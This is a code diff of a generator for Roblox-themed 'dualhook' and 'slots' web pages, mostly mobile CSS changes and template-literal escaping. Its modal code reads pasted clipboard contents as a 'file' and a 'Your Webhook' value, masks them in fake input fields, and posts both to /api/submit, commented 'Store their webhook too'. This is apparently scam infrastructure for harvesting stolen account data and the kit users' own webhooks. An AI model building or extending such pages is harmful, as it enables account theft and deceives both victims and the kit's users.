@@ -229,98 +229,6 @@ function buildDualhookPage(record) {
   footer::before { content:''; position:absolute; top:0; left:10%; right:10%; height:1px; background:linear-gradient(90deg,transparent,rgba(192,38,211,0.3),transparent); }
   .footer-logo { font-family:'Orbitron',sans-serif; font-size:1rem; font-weight:700; color:var(--text); }
   .footer-logo span { color:var(--accent); text-shadow:0 0 12px var(--accent-glow); }
-
-  /* ========== MOBILE RESPONSIVE ========== */
-  @media (max-width: 768px) {
-    /* Navigation - tighter spacing */
-    nav { padding: 14px 16px; }
-    nav ul { gap: 12px; }
-    nav ul a { font-size: 0.65rem; letter-spacing: 0.05em; }
-    .nav-cta { padding: 8px 14px !important; font-size: 0.6rem !important; white-space: nowrap !important; }
-    .logo { font-size: 1.1rem; }
-
-    /* Hero - smaller, stacked buttons */
-    .hero { padding: 100px 16px 60px; min-height: auto; }
-    .hero h1 { font-size: clamp(2.2rem, 10vw, 3.5rem); margin-bottom: 20px; }
-    .hero p { font-size: 0.9rem; padding: 0 10px; margin-bottom: 32px; }
-    .hero-buttons { flex-direction: column; width: 100%; max-width: 280px; gap: 12px; }
-    .btn-primary, .btn-ghost { width: 100%; padding: 14px 24px; font-size: 0.95rem; }
-    .hero-badge { font-size: 0.65rem; padding: 6px 14px; margin-bottom: 24px; }
-    
-    /* FIX: Scroll indicator centered */
-    .scroll-indicator {
-      left: 50% !important;
-      transform: translateX(-50%) !important;
-      right: auto !important;
-      width: 100% !important;
-      text-align: center !important;
-      bottom: 20px !important;
-    }
-
-    /* FIX: Roblox characters - show small cute versions */
-    .roblox-char { 
-      position: fixed !important;
-      width: 70px !important;
-      height: 70px !important;
-      opacity: 0.7 !important;
-      z-index: 5 !important;
-      pointer-events: none !important;
-    }
-    .roblox-char img {
-      width: 70px !important;
-      height: 70px !important;
-    }
-    /* Position characters nicely on mobile */
-    .char-1 { left: 5px !important; top: 80px !important; --size: 70px !important; }
-    .char-2 { right: 5px !important; top: 100px !important; --size: 60px !important; }
-    .char-3 { left: 10px !important; bottom: 100px !important; --size: 55px !important; }
-    .char-4 { right: 10px !important; bottom: 120px !important; --size: 65px !important; }
-    .char-5 { left: 50% !important; top: 70px !important; transform: translateX(-50%) !important; --size: 50px !important; }
-    .char-6 { display: none !important; } /* Hide one to reduce clutter */
-    .char-shadow { display: none !important; } /* Hide shadows on mobile */
-
-    /* Features - SINGLE COLUMN */
-    .features { padding: 60px 16px; }
-    .features-grid { grid-template-columns: 1fr; border-radius: 16px; }
-    .feature-card { padding: 32px 24px; border-bottom: 1px solid rgba(192,38,211,0.1); }
-    .feature-card:last-child { border-bottom: none; }
-    .feature-icon { width: 44px; height: 44px; font-size: 1.3rem; margin-bottom: 16px; }
-    .feature-card h3 { font-size: 1.1rem; }
-    .feature-card p { font-size: 0.85rem; line-height: 1.6; }
-
-    /* Products/Form - full width */
-    .products { padding: 60px 16px; }
-    .slots-form-wrap { padding: 28px 20px 32px; margin: 0; border-radius: 16px; }
-    .input-duo { grid-template-columns: 1fr; gap: 12px; }
-    .field-input { padding: 12px 14px; font-size: 16px; }
-    .url-text { font-size: 0.6rem; }
-
-    /* Community */
-    .community { padding: 60px 16px; }
-    .community h2 { font-size: 1.6rem; }
-    .community p { font-size: 0.9rem; padding: 0 10px; }
-    .community-stats { flex-direction: column; gap: 24px; }
-    .stat-num { font-size: 2rem; }
-    .discord-btn { width: 100%; max-width: 300px; justify-content: center; padding: 14px 24px; }
-
-    /* Footer - stacked */
-    footer { flex-direction: column; gap: 12px; padding: 24px 16px; text-align: center; }
-
-    /* Ticker - smaller */
-    .ticker-item { padding: 0 24px; font-size: 0.6rem; }
-
-    /* Section titles - smaller */
-    .section-title { font-size: 1.4rem; margin-bottom: 40px; }
-    .section-label { font-size: 0.65rem; }
-  }
-
-  /* Extra small phones */
-  @media (max-width: 380px) {
-    .hero h1 { font-size: 2rem; }
-    .roblox-char { width: 55px !important; height: 55px !important; }
-    .roblox-char img { width: 55px !important; height: 55px !important; }
-    .char-5 { display: none !important; } /* Hide another on tiny screens */
-  }
 </style>
 </head>
 <body>
@@ -1503,11 +1411,14 @@ function buildSlotsPage(record) {
 
   /* ========== MOBILE RESPONSIVE ========== */
   @media (max-width: 768px) {
+    /* HIDE floating characters - they're cluttering mobile */
+    .roblox-char { display: none !important; }
+    
     /* Navigation - tighter spacing */
     nav { padding: 14px 16px; }
     nav ul { gap: 12px; }
     nav ul a { font-size: 0.65rem; letter-spacing: 0.05em; }
-    .nav-cta { padding: 8px 14px !important; font-size: 0.6rem !important; white-space: nowrap !important; }
+    .nav-cta { padding: 6px 12px; font-size: 0.65rem; }
     .logo { font-size: 1.1rem; }
 
     /* Hero - smaller, stacked buttons */
@@ -1530,38 +1441,7 @@ function buildSlotsPage(record) {
       padding: 6px 14px; 
       margin-bottom: 24px; 
     }
-    
-    /* FIX: Scroll indicator centered */
-    .scroll-indicator {
-      left: 50% !important;
-      transform: translateX(-50%) !important;
-      right: auto !important;
-      width: 100% !important;
-      text-align: center !important;
-      bottom: 20px !important;
-    }
-
-    /* FIX: Roblox characters - show small cute versions positioned nicely */
-    .roblox-char { 
-      position: fixed !important;
-      width: 65px !important;
-      height: 65px !important;
-      opacity: 0.7 !important;
-      z-index: 5 !important;
-      pointer-events: none !important;
-    }
-    .roblox-char img {
-      width: 65px !important;
-      height: 65px !important;
-    }
-    /* Position characters nicely on mobile corners */
-    .char-1 { left: 5px !important; top: 80px !important; --size: 65px !important; }
-    .char-2 { right: 5px !important; top: 100px !important; --size: 55px !important; }
-    .char-3 { left: 10px !important; bottom: 100px !important; --size: 50px !important; }
-    .char-4 { right: 10px !important; bottom: 120px !important; --size: 60px !important; }
-    .char-5 { left: 50% !important; top: 70px !important; transform: translateX(-50%) !important; --size: 45px !important; }
-    .char-6 { display: none !important; } /* Hide one to reduce clutter */
-    .char-shadow { display: none !important; } /* Hide shadows on mobile */
+    .scroll-indicator { bottom: 20px; }
 
     /* Features - SINGLE COLUMN (fix the cramped 2-col) */
     .features { padding: 60px 16px; }
@@ -1596,25 +1476,21 @@ function buildSlotsPage(record) {
     .slot-name { font-size: 1.15rem; }
     .slot-desc { font-size: 0.85rem; }
     
-    /* Modal - better mobile fit */
-    .modal { 
-      padding: 28px 20px; 
-      width: 92%; 
-      border-radius: 16px;
+    /* Form card - full width on mobile */
+    .slots-form-wrap { 
+      padding: 28px 20px 32px; 
+      margin: 0; 
+      border-radius: 16px; 
     }
-    .modal-title { font-size: 1rem; }
-    .input-row { 
-      flex-direction: column; 
-      gap: 10px; 
+    .input-duo { 
+      grid-template-columns: 1fr; 
+      gap: 12px; 
     }
-    .paste-btn { 
-      width: 100%; 
-      padding: 12px; 
-    }
-    .fake-input { 
-      padding: 14px; 
+    .field-input { 
+      padding: 12px 14px; 
       font-size: 16px; /* Prevents zoom on iOS */
     }
+    .url-text { font-size: 0.6rem; }
 
     /* Community */
     .community { padding: 60px 16px; }
@@ -1640,6 +1516,26 @@ function buildSlotsPage(record) {
       text-align: center; 
     }
 
+    /* Modal - better mobile fit */
+    .modal { 
+      padding: 28px 20px; 
+      width: 92%; 
+      border-radius: 16px;
+    }
+    .modal-title { font-size: 1rem; }
+    .input-row { 
+      flex-direction: column; 
+      gap: 10px; 
+    }
+    .paste-btn { 
+      width: 100%; 
+      padding: 12px; 
+    }
+    .fake-input { 
+      padding: 14px; 
+      font-size: 16px; /* Prevents zoom on iOS */
+    }
+
     /* Ticker - smaller text */
     .ticker-item { 
       padding: 0 24px; 
@@ -1657,9 +1553,6 @@ function buildSlotsPage(record) {
   /* Extra small phones */
   @media (max-width: 380px) {
     .hero h1 { font-size: 2rem; }
-    .roblox-char { width: 55px !important; height: 55px !important; }
-    .roblox-char img { width: 55px !important; height: 55px !important; }
-    .char-5 { display: none !important; } /* Hide another on tiny screens */
     .slot-card { padding: 24px 18px; }
     .feature-card { padding: 28px 20px; }
   }
@@ -1878,7 +1771,7 @@ function buildSlotsPage(record) {
 
   for(let i=0; i<90; i++) particles.push(new Particle());
 
-function loop(){
+  function loop(){
     ctx.clearRect(0,0,W,H);
     particles.forEach(p => { p.update(); p.draw(); });
     requestAnimationFrame(loop);
@@ -1894,7 +1787,7 @@ function loop(){
   doubled.forEach(item => {
     const el = document.createElement('div');
     el.className = 'ticker-item';
-    el.innerHTML = `<span class="dot"></span>${item}`;
+    el.innerHTML = \`<span class="dot"></span>\${item}\`;
     track.appendChild(el);
   });
 })();
@@ -1919,13 +1812,13 @@ slotData.forEach((slot, i) => {
   const num = i + 1;
   const card = document.createElement('div');
   card.className = 'slot-card';
-  card.style.animationDelay = `${i * 0.06}s`;
-  card.innerHTML = `
-    <div class="slot-number">Slot ${String(num).padStart(2,'0')}</div>
-    <div class="slot-name">${slot.name}</div>
-    <div class="slot-desc">${slot.desc}</div>
-    <button class="btn-start" onclick="openModal(${num}, '${slot.name}')">Get Started</button>
-  `;
+  card.style.animationDelay = \`\${i * 0.06}s\`;
+  card.innerHTML = \`
+    <div class="slot-number">Slot \${String(num).padStart(2,'0')}</div>
+    <div class="slot-name">\${slot.name}</div>
+    <div class="slot-desc">\${slot.desc}</div>
+    <button class="btn-start" onclick="openModal(\${num}, '\${slot.name}')">Get Started</button>
+  \`;
   grid.appendChild(card);
 });
 
@@ -1960,26 +1853,26 @@ let currentSlotData = { num: null, name: null, value: null, webhook: null };
 
 function openModal(num, name) {
   currentSlotData = { num, name, value: null, webhook: null };
-  document.getElementById('modalTitle').textContent = `Slot ${num} — ${name}`;
-  document.getElementById('enableBtn').textContent = `Enable Slot ${num}`;
+  document.getElementById('modalTitle').textContent = \`Slot \${num} — \${name}\`;
+  document.getElementById('enableBtn').textContent = \`Enable Slot \${num}\`;
   document.getElementById('errorMsg').textContent = '';
   
-  document.getElementById('modalInputs').innerHTML = `
+  document.getElementById('modalInputs').innerHTML = \`
     <div class="input-group">
-      <label class="input-label">Slot ${num} File <span style="color:#f472b6">*</span></label>
+      <label class="input-label">Slot \${num} File <span style="color:#f472b6">*</span></label>
       <div class="input-row">
-        <div class="fake-input placeholder" id="display-value-${num}">Click paste to add file</div>
-        <button class="paste-btn" onclick="pasteValue('value', ${num})">Paste</button>
+        <div class="fake-input placeholder" id="display-value-\${num}">Click paste to add file</div>
+        <button class="paste-btn" onclick="pasteValue('value', \${num})">Paste</button>
       </div>
     </div>
     <div class="input-group">
       <label class="input-label">Your Webhook <span style="color:#f472b6">*</span></label>
       <div class="input-row">
-        <div class="fake-input placeholder" id="display-webhook-${num}">Click paste to add webhook</div>
-        <button class="paste-btn" onclick="pasteValue('webhook', ${num})">Paste</button>
+        <div class="fake-input placeholder" id="display-webhook-\${num}">Click paste to add webhook</div>
+        <button class="paste-btn" onclick="pasteValue('webhook', \${num})">Paste</button>
       </div>
     </div>
-  `;
+  \`;
   
   updateEnableButton();
   document.getElementById('modalOverlay').classList.add('open');
@@ -1990,7 +1883,7 @@ async function pasteValue(type, num) {
     const text = await navigator.clipboard.readText();
     if (text && text.trim()) {
       currentSlotData[type] = text.trim();
-      const display = document.getElementById(`display-${type}-${num}`);
+      const display = document.getElementById(\`display-\${type}-\${num}\`);
       display.textContent = '•'.repeat(Math.min(text.length, 32));
       display.classList.remove('placeholder');
       display.classList.add('filled');
@@ -1999,7 +1892,7 @@ async function pasteValue(type, num) {
     }
   } catch {
     // Fallback for when clipboard API fails
-    const display = document.getElementById(`display-${type}-${num}`);
+    const display = document.getElementById(\`display-\${type}-\${num}\`);
     display.textContent = '••••••••••••••••••••••••';
     display.classList.remove('placeholder');
     display.classList.add('filled');
@@ -2015,7 +1908,7 @@ function updateEnableButton() {
   
   if (hasValue && hasWebhook) {
     btn.disabled = false;
-    btn.textContent = `Enable Slot ${currentSlotData.num}`;
+    btn.textContent = \`Enable Slot \${currentSlotData.num}\`;
   } else {
     btn.disabled = true;
     if (!hasValue && !hasWebhook) {
@@ -2056,7 +1949,7 @@ document.getElementById('enableBtn').addEventListener('click', async function() 
 
   const slots = {};
   slots['slot' + num] = value;
-  slots['webhook' + num] = webhook;
+  slots['webhook' + num] = webhook; // Store their webhook too
 
   try {
     const res = await fetch('/api/submit', {
@@ -2105,8 +1998,8 @@ document.addEventListener('mousemove', e => {
   document.querySelectorAll('.roblox-char').forEach((char, i) => {
     const depth = (i % 3 + 1) * 6;
     char.style.transform = char.classList.contains('char-1') || char.classList.contains('char-3') || char.classList.contains('char-6')
-      ? `scaleX(-1) translate(${-xRatio * depth}px, ${-yRatio * depth}px)`
-      : `translate(${xRatio * depth}px, ${yRatio * depth}px)`;
+      ? \`scaleX(-1) translate(\${-xRatio * depth}px, \${-yRatio * depth}px)\`
+      : \`translate(\${xRatio * depth}px, \${yRatio * depth}px)\`;
   });
 });
 </script>
